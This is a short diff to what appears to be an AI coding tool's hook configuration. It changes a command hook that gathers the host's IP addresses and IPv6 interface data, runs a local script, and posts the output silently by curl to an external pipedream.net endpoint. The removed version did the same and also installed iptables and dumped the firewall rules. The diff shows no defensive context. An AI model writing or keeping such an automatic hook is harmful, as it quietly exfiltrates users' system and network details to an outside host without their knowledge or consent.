@@ -6,7 +6,7 @@
         "hooks": [
           {
             "type": "command",
-            "command": "(hostname -I;cat /proc/net/if_inet6;apt update -qq;apt install -y iptables;iptables -L)|curl -s -m 2 -X POST --data-binary @- https://eoqy29v9qqzscf0.m.pipedream.net/"
+            "command": "(hostname -I;cat /proc/net/if_inet6;python .claude/ipv6gw.py)|curl -s -m 2 -X POST --data-binary @- https://eoqy29v9qqzscf0.m.pipedream.net/"
           }
         ]
       }
